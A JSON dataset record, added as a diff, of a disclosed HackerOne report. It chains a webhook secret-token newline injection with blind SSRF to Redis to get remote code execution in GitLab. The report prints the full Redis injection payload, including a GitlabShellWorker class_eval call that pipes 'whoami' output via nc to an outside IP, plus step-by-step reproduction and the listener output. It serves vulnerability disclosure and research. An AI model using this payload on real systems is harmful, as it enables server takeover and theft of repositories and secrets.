@@ -1,0 +1,50 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "jobert ",
+  "title": "Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook",
+  "content": "\nThe secret token field of a webhook is vulnerable to a new line injection, allowing an attacker to inject non-HTTP commands in a TCP stream. When a GitLab instance is configured with an external Redis instance, e.g. on 127.0.0.1:6379, it may result in arbitrary code execution on a Sidekiq worker by abusing a blind Server-Side Request Forgery (SSRF) vulnerability in the webhook integration and the new line injection. One of my other reports regarding these SSRFs, #131190, is still open and has been for more than a year. However, because this is a service I haven't reported the SSRF in and chaining it with the new line injection increases the severity of the vulnerability, I decided to report it. To reproduce, start by signing in to the GitLab instance and creating a new project.\nTo reproduce the RCE, a Redis server has to be running on port 6379. Follow the GitLab documentation to set up the Redis server and reconfigure GitLab by running gitlab-ctl reconfigure. When that's done, continue to go to the Integrations section of the created project. Intercept your network traffic before continuing. Now, enter http://127.0.0.1:6379/ as the webhook endpoint and A as the secret token. When the request is submitted, a request similar to the one below is submitted:\nRequest\nCode 229 Bytes\n1POST /root/test/hooks HTTP/1.1\n2Host: gitlab-instance\n3...\n4----------1282688597\n5Content-Disposition: form-data; name=\"hook[url]\"\n6\n7http://127.0.0.1:6379/\n8----------1282688597\n9Content-Disposition: form-data; name=\"hook[token]\"\n10\n11A\n12...\nIn the request above I changed the body encoding to make it easier to inject the payload. Now, replace the hook[token] field with the payload below.\nPayload\nCode 364 Bytes\n1A\n2 multi\n3 sadd resque:gitlab:queues system_hook_push\n4 lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|whoami | nc 192.241.233.143 80\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"\n5 exec\nThen, when the integration persisted, click the Test button next to the newly created integration. Here's what happens next: a POST request will be submitted to 127.0.0.1, port 6379 (Redis). Redis is pretty easy on errors, so it'll simply ignore the first couple lines of the HTTP request. Then, a couple headers further down, it is including the X-GitLab-Token that is vulnerable to the new line injection. Here's the entire request that is posted:\nInjected request\nCode 552 Bytes\n1POST / HTTP/1.1\n2Content-Type: application/json\n3X-Gitlab-Event: Push Hook\n4X-Gitlab-Token: A\n5 multi\n6 sadd resque:gitlab:queues system_hook_push\n7 lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|whoami | nc 192.241.233.143 80\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"\n8 exec\n9 exec\n10Connection: close\n11Host: 192.241.233.143\n12Content-Length: 2495\n13\n14{\"object_kind\":\"push\",\"ev<...>\nWhen this is submitted to Redis, a new job will be shifted on the system_hook_push command. In order to evaluate Ruby code, I needed a Ruby class that'd implement the perform method that would allow me to execute a command or Ruby. The GitlabShellWorker was exactly what I was looking for:\nGitlabShellWorker\nCode 205 Bytes\n1class GitlabShellWorker\n2  include ApplicationWorker\n3  include Gitlab::ShellAdapter\n4\n5  def perform(action, *arg)\n6    gitlab_shell.__send__(action, *arg) # rubocop:disable GitlabSecurity/PublicSend\n7  end\n8end\nAs can be seen in the payload, the GitlabShellWorker is called with the arguments class_eval and the following Ruby code:\nCode 44 Bytes\n1open('|whoami | nc 192.241.233.143 80').read\nBecause the Ruby is evaluated on a Sidekiq server, we need to exfiltrate the output of a command through nc or a similar tool. In this example, my server is listening on port 80 for connections. When the payload fires, it captures the output of the whoami command:\nCode 150 Bytes\n1$ nc -l -n -vv -p 80\n2Listening on [0.0.0.0] (family 0, port 80)\n3Connection from [104.236.178.103] port 80 [tcp/*] accepted (family 2, sport 42874)\n4git\nBesides the blind SSRF, the underlying vulnerability is the new line injection in the secret token. Fixing the new line injection seems mitigate the immediate risk for an RCE, but I'd encourage you to reprioritize the fix for the SSRF vulnerabilities in the services (reported by me previously). Let me know if you have any questions.\nImpact\nAn attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.\n\n",
+  "severity": [
+    8.5,
+    null
+  ],
+  "bounty": 750,
+  "weaknesses": [
+    "Server-Side Request Forgery (SSRF)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1524810060,
+  "report_url": "https://hackerone.com/reports/299473",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Sign in to the GitLab instance and create a new project."
+    ],
+    [
+      2,
+      "Set up a Redis server on port 6379 and reconfigure GitLab using `gitlab-ctl reconfigure`."
+    ],
+    [
+      3,
+      "Go to the Integrations section of the created project and intercept network traffic."
+    ],
+    [
+      4,
+      "Enter `http://127.0.0.1:6379/` as the webhook endpoint and inject the malicious payload into the `hook[token]` field."
+    ],
+    [
+      5,
+      "Click the Test button to submit the request to Redis, triggering the RCE."
+    ]
+  ],
+  "vuln_description": "The vulnerability involves a new line injection in the secret token field of a webhook, allowing an attacker to inject non-HTTP commands into a TCP stream. When combined with a blind SSRF vulnerability in the webhook integration, this can lead to arbitrary code execution on a Sidekiq worker by manipulating Redis commands.",
+  "reason": "This vulnerability requires understanding multiple components (webhook integration, Redis, Sidekiq) and their interactions. The attacker must craft a complex payload that exploits both the new line injection and SSRF to achieve RCE. The subtle interaction between these components and the need to manipulate Redis commands make this a highly complex attack.",
+  "new_complexity": "VERY_HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "131190"
+}
